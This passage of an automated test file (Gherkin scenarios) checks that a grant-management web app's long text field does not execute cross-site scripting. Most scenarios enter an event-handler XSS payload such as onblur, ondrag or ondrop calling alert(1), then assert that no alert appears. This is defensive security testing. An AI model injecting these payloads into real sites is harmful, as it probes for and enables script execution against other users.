      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                              | Field                          |
      | <a onbeforecut="alert(1)" contenteditable>test</a> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304188 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                        | Field                          |
      | <xss contenteditable onbeforeinput=alert(1)> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304193 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                    | Field                          |
      | <xss onblur=alert(1) id=x tabindex=1 style=display:block>test</xss><input value=clickme> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304194 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                               | Field                          |
      | <input onchange=alert(1) value=xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304195 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                  | Field                          |
      | <xss onclick="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304197 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                         | Field                          |
      | <dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304202 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                        | Field                          |
      | <xss oncontextmenu="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304204 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                      | Field                          |
      | <xss oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304205 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                     | Field                          |
      | <xss oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304206 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                          | Field                          |
      | <xss ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304209 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                  | Field                          |
      | <xss draggable="true" ondrag="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304212 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                     | Field                          |
      | <xss draggable="true" ondragend="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304213 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                       | Field                          |
      | <xss draggable="true" ondragenter="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304214 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                       | Field                          |
      | <xss draggable="true" ondragleave="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304220 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                                           | Field                          |
      | <div draggable="true" contenteditable>drag me</div><xss ondragover=alert(1) contenteditable style=display:block>drop here</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304221 @Vrushali
  Scenario Outline:XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                       | Field                          |
      | <xss draggable="true" ondragstart="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304224 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                                       | Field                          |
      | <div draggable="true" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable style=display:block>drop here</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304225 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
